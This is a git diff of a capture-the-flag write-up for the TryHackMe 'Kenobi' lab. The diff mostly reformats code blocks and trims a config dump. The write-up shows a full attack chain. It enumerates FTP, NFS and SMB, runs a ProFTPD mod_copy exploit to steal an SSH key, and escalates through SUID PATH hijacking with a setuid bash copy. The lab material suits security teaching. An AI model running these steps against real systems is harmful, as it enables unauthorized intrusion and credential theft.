@@ -21,7 +21,7 @@ Please **NOTE**: The commands in this writeup vary slightly from the room walkth
 
 The initial nmap scan shows that there are five ports open, as shown below:
 
-```
+```console
 21/open/tcp/ftp/ProFTPD1.3.5
 22/open/tcp/ssh/OpenSSH7.2p2Ubuntu4ubuntu2.7(UbuntuLinux;protocol2.0)
 80/open/tcp/http/Apachehttpd2.4.18((Ubuntu))
@@ -35,8 +35,9 @@ The initial nmap scan shows that there are five ports open, as shown below:
 
 Checking for anonymous access, it seems like anonymous access is allowed, but it's prompting for a full email as a password. Trying easy things like "anonymous", "anonymous{at}kenobi.thm", and a blank password didn't work. 
 
-```bash
-ftp $ip 21
+```console 
+$ ftp $ip 21
+
 Connected to 10.10.68.225.
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]
 Name (10.10.68.225:thomas): anonymous
@@ -50,8 +51,9 @@ ftp> exit
 
 A later question will ask for the version number of ProFtpd running. It's in the output above, but we can also use `netcat` to grab the banner.
 
-```bash
-nc -nv $ip 21
+```console
+$ nc -nv $ip 21
+
 Connection to 10.10.68.225 21 port [tcp/*] succeeded!
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]
 ```
@@ -60,24 +62,25 @@ Connection to 10.10.68.225 21 port [tcp/*] succeeded!
 
 It looks like there's a file share exported that we may be able to look at. 
 
-```bash
-showmount -e $ip
+```console
+$ showmount -e $ip
+
 Export list for 10.10.68.225:
 /var *
 ```
 
 We can mount the exported share with:
 
-```bash
-sudo mount -t nfs $ip:/var var -o nolock
+```console
+$ sudo mount -t nfs $ip:/var var -o nolock
 ```
 
 And then we can list the contents of the exported share.
 
 ![](images/tryhackme_kenobi/Pasted%20image%2020240607125757.png)
 
-```bash
-tree
+```console
+$ tree
 .
 ├── backups
 │   └── apt.extended_states.0
@@ -316,8 +319,9 @@ After looking over this briefly, it doesn't seem like there's anything SUPER jui
 
 Using netexec, we can enumerate accessible shares on the server.
 
-```bash
-nxc smb $ip -u '' -p '' --shares
+```console
+$ nxc smb $ip -u '' -p '' --shares
+
 SMB         10.10.68.225    445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)
 SMB         10.10.68.225    445    KENOBI           [+] \:
 SMB         10.10.68.225    445    KENOBI           [*] Enumerated shares
@@ -332,8 +336,9 @@ Note that we have anonymous access to the `anonymous` share.
 
 Using `smbclient.py` from Impacket, we an enumerate the share. Seems like there's one file present, called `log.txt`. 
 
-```bash
-smbclient.py anonymous:anonymous@$ip
+```console
+$ smbclient.py anonymous:anonymous@$ip
+
 Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra
 
 Type help for list of commands
@@ -401,309 +406,7 @@ Umask                           022
 # (such as xinetd).
 MaxInstances                    30
 
-# Set the user and group under which the server will run.
-User                            kenobi
-Group                           kenobi
-
-# To cause every FTP user to be "jailed" (chrooted) into their home
-# directory, uncomment this line.
-#DefaultRoot ~
-
-# Normally, we want files to be overwriteable.
-AllowOverwrite          on
-
-# Bar use of SITE CHMOD by default
-<Limit SITE_CHMOD>
-  DenyAll
-</Limit>
-
-# A basic anonymous configuration, no upload directories.  If you do not
-# want anonymous users, simply delete this entire <Anonymous> section.
-<Anonymous ~ftp>
-  User                          ftp
-  Group                         ftp
-
-  # We want clients to be able to login with "anonymous" as well as "ftp"
-  UserAlias                     anonymous ftp
-
-  # Limit the maximum number of anonymous logins
-  MaxClients                    10
-
-  # We want 'welcome.msg' displayed at login, and '.message' displayed
-  # in each newly chdired directory.
-  DisplayLogin                  welcome.msg
-  DisplayChdir                  .message
-
-  # Limit WRITE everywhere in the anonymous chroot
-  <Limit WRITE>
-    DenyAll
-  </Limit>
-</Anonymous>
-#
-# Sample configuration file for the Samba suite for Debian GNU/Linux.
-#
-#
-# This is the main Samba configuration file. You should read the
-# smb.conf(5) manual page in order to understand the options listed
-# here. Samba has a huge number of configurable options most of which
-# are not shown in this example
-#
-# Some options that are often worth tuning have been included as
-# commented-out examples in this file.
-#  - When such options are commented with ";", the proposed setting
-#    differs from the default Samba behaviour
-#  - When commented with "#", the proposed setting is the default
-#    behaviour of Samba but the option is considered important
-#    enough to be mentioned here
-#
-# NOTE: Whenever you modify this file you should run the command
-# "testparm" to check that you have not made any basic syntactic
-# errors.
-
-#======================= Global Settings =======================
-
-[global]
-
-## Browsing/Identification ###
-
-# Change this to the workgroup/NT-domain name your Samba server will part of
-   workgroup = WORKGROUP
-
-# server string is the equivalent of the NT Description field
-        server string = %h server (Samba, Ubuntu)
-
-# Windows Internet Name Serving Support Section:
-# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
-#   wins support = no
-
-# WINS Server - Tells the NMBD components of Samba to be a WINS Client
-# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
-;   wins server = w.x.y.z
-
-# This will prevent nmbd to search for NetBIOS names through DNS.
-   dns proxy = no
-
-#### Networking ####
-
-# The specific set of interfaces / networks to bind to
-# This can be either the interface name or an IP address/netmask;
-# interface names are normally preferred
-;   interfaces = 127.0.0.0/8 eth0
-
-# Only bind to the named interfaces and/or networks; you must use the
-# 'interfaces' option above to use this.
-# It is recommended that you enable this feature if your Samba machine is
-# not protected by a firewall or is a firewall itself.  However, this
-# option cannot handle dynamic or non-broadcast interfaces correctly.
-;   bind interfaces only = yes
-
-
-
-#### Debugging/Accounting ####
-
-# This tells Samba to use a separate log file for each machine
-# that connects
-   log file = /var/log/samba/log.%m
-
-# Cap the size of the individual log files (in KiB).
-   max log size = 1000
-
-# If you want Samba to only log through syslog then set the following
-# parameter to 'yes'.
-#   syslog only = no
-
-# We want Samba to log a minimum amount of information to syslog. Everything
-# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
-# through syslog you should set the following parameter to something higher.
-   syslog = 0
-
-# Do something sensible when Samba crashes: mail the admin a backtrace
-   panic action = /usr/share/samba/panic-action %d
-
-
-####### Authentication #######
-
-# Server role. Defines in which mode Samba will operate. Possible
-# values are "standalone server", "member server", "classic primary
-# domain controller", "classic backup domain controller", "active
-# directory domain controller".
-#
-# Most people will want "standalone sever" or "member server".
-# Running as "active directory domain controller" will require first
-# running "samba-tool domain provision" to wipe databases and create a
-# new domain.
-   server role = standalone server
-
-# If you are using encrypted passwords, Samba will need to know what
-# password database type you are using.
-   passdb backend = tdbsam
-
-   obey pam restrictions = yes
-
-# This boolean parameter controls whether Samba attempts to sync the Unix
-# password with the SMB password when the encrypted SMB password in the
-# passdb is changed.
-   unix password sync = yes
-
-# For Unix password sync to work on a Debian GNU/Linux system, the following
-# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
-# sending the correct chat script for the passwd program in Debian Sarge).
-   passwd program = /usr/bin/passwd %u
-   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
-
-# This boolean controls whether PAM will be used for password changes
-# when requested by an SMB client instead of the program listed in
-# 'passwd program'. The default is 'no'.
-   pam password change = yes
-
-# This option controls how unsuccessful authentication attempts are mapped
-# to anonymous connections
-   map to guest = bad user
-
-########## Domains ###########
-
-#
-# The following settings only takes effect if 'server role = primary
-# classic domain controller', 'server role = backup domain controller'
-# or 'domain logons' is set
-#
-
-# It specifies the location of the user's
-# profile directory from the client point of view) The following
-# required a [profiles] share to be setup on the samba server (see
-# below)
-;   logon path = \\%N\profiles\%U
-# Another common choice is storing the profile in the user's home directory
-# (this is Samba's default)
-#   logon path = \\%N\%U\profile
-
-# The following setting only takes effect if 'domain logons' is set
-# It specifies the location of a user's home directory (from the client
-# point of view)
-;   logon drive = H:
-#   logon home = \\%N\%U
-
-# The following setting only takes effect if 'domain logons' is set
-# It specifies the script to run during logon. The script must be stored
-# in the [netlogon] share
-# NOTE: Must be store in 'DOS' file format convention
-;   logon script = logon.cmd
-
-# This allows Unix users to be created on the domain controller via the SAMR
-# RPC pipe.  The example command creates a user account with a disabled Unix
-# password; please adapt to your needs
-; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u
-
-# This allows machine accounts to be created on the domain controller via the
-# SAMR RPC pipe.
-# The following assumes a "machines" group exists on the system
-; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u
-
-# This allows Unix groups to be created on the domain controller via the SAMR
-# RPC pipe.
-; add group script = /usr/sbin/addgroup --force-badname %g
-
-############ Misc ############
-
-# Using the following line enables you to customise your configuration
-# on a per machine basis. The %m gets replaced with the netbios name
-# of the machine that is connecting
-;   include = /home/samba/etc/smb.conf.%m
-
-# Some defaults for winbind (make sure you're not using the ranges
-# for something else.)
-;   idmap uid = 10000-20000
-;   idmap gid = 10000-20000
-;   template shell = /bin/bash
-
-# Setup usershare options to enable non-root users to share folders
-# with the net usershare command.
-
-# Maximum number of usershare. 0 (default) means that usershare is disabled.
-;   usershare max shares = 100
-
-# Allow users who've been granted usershare privileges to create
-# public shares, not just authenticated ones
-   usershare allow guests = yes
-
-#======================= Share Definitions =======================
-
-# Un-comment the following (and tweak the other settings below to suit)
-# to enable the default home directory shares. This will share each
-# user's home directory as \\server\username
-;[homes]
-;   comment = Home Directories
-;   browseable = no
-
-# By default, the home directories are exported read-only. Change the
-# next parameter to 'no' if you want to be able to write to them.
-;   read only = yes
-
-# File creation mask is set to 0700 for security reasons. If you want to
-# create files with group=rw permissions, set next parameter to 0775.
-;   create mask = 0700
-
-# Directory creation mask is set to 0700 for security reasons. If you want to
-# create dirs. with group=rw permissions, set next parameter to 0775.
-;   directory mask = 0700
-
-# By default, \\server\username shares can be connected to by anyone
-# with access to the samba server.
-# Un-comment the following parameter to make sure that only "username"
-# can connect to \\server\username
-# This might need tweaking when using external authentication schemes
-;   valid users = %S
-
-# Un-comment the following and create the netlogon directory for Domain Logons
-# (you need to configure Samba to act as a domain controller too.)
-;[netlogon]
-;   comment = Network Logon Service
-;   path = /home/samba/netlogon
-;   guest ok = yes
-;   read only = yes
-
-# Un-comment the following and create the profiles directory to store
-# users profiles (see the "logon path" option above)
-# (you need to configure Samba to act as a domain controller too.)
-# The path below should be writable by all users so that their
-# profile directory may be created the first time they log on
-;[profiles]
-;   comment = Users profiles
-;   path = /home/samba/profiles
-;   guest ok = no
-;   browseable = no
-;   create mask = 0600
-;   directory mask = 0700
-
-[printers]
-   comment = All Printers
-   browseable = no
-   path = /var/spool/samba
-   printable = yes
-   guest ok = no
-   read only = yes
-   create mask = 0700
-
-# Windows clients look for this share name as a source of downloadable
-# printer drivers
-[print$]
-   comment = Printer Drivers
-   path = /var/lib/samba/printers
-   browseable = yes
-   read only = yes
-   guest ok = no
-# Uncomment to allow remote administration of Windows print drivers.
-# You may need to replace 'lpadmin' with the name of the group your
-# admin users are members of.
-# Please note that you also need to set appropriate Unix permissions
-# to the drivers directory for these users to have write rights in it
-;   write list = root, @lpadmin
-[anonymous]
-   path = /home/kenobi/share
-   browseable = yes
-   read only = yes
-   guest ok = yes
-
+[...SNIP...]
 ```
 
 ### Initial Access
@@ -714,14 +417,15 @@ Checking exploit-db for exploits related to the ProFtpd version we identified, w
 
 I'm going to grab the exploit 49908 using 
 
-```bash
-searchsploit -m 49908
+```console
+$ searchsploit -m 49908
 ```
 
 After modifying the exploit slightly, I was able to copy the `id_rsa` key from the `kenobi` user's home directory into the `/var/tmp/` directory so I'm able to access it though the share I mounted earlier. 
 
-```bash
-python3 49908.py 10.10.68.225
+```console
+$ python3 49908.py 10.10.68.225
+
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]
 
 350 File or directory exists, ready for destination name
@@ -743,8 +447,9 @@ After running the exploit, we can see that the key is now in the `/var/tmp` dire
 
 After changing the permissions on the key to 600 (`chmod 600 <KEY>`) we're able to ssh into the box as the `kenobi` user. 
 
-```bash
-ssh -i kenobi kenobi@$ip
+```console
+$ ssh -i kenobi kenobi@$ip
+
 The authenticity of host '10.10.68.225 (10.10.68.225)' can't be established.
 ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
 This key is not known by any other names.
@@ -771,8 +476,8 @@ kenobi@kenobi:~$
 
 We can list SUID binaries with the following command:
 
-```bash
-find / -perm -u=s -type f 2>/dev/null
+```console
+$ find / -perm -u=s -type f 2>/dev/null
 ```
 
 One stands out as odd.
@@ -785,7 +490,7 @@ Running that binary, we're presented with three options.
 
 Running through all the options once, it seems pretty straightforward, so we'll need to figure out a way to abuse it.
 
-```bash
+```console
 kenobi@kenobi:~$ /usr/bin/menu
 
 ***************************************
@@ -843,13 +548,13 @@ To do this, I'm going to copy `/bin/bash` to my home directory, and then modify 
 
 First, copy the `/bin/bash` binary to the home directory. 
 
-```bash
+```console
 kenobi@kenobi:~$ cp /bin/bash .
 ```
 
 Then, we can confirm that the `bash` binary is present in the home directory now.
 
-```bash
+```console
 kenobi@kenobi:~$ ls -la
 total 1056
 drwxr-xr-x 5 kenobi kenobi    4096 Jun  7 13:55 .
@@ -868,19 +573,19 @@ drwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh
 
 Since we're attempting to trick the application into running our binary instead of the one it's supposed to run, we need to change the name of the `bash` binary to `ifconfig`
 
-```bash
+```console
 kenobi@kenobi:~$ mv bash ifconfig
 ```
 
 We also need to set the permissions on the copied `bash` binary to make sure that it doesn't drop privileges. 
 
-```bash
-chmod 4777 ifconfig
+```console
+$ chmod 4777 ifconfig
 ```
 
 Once we've done that, we can add the current working directory (`/home/kenobi` in my case) to the `PATH` environment variable. 
 
-```bash
+```console
 kenobi@kenobi:~$ export PATH=.:$PATH
 ```
 
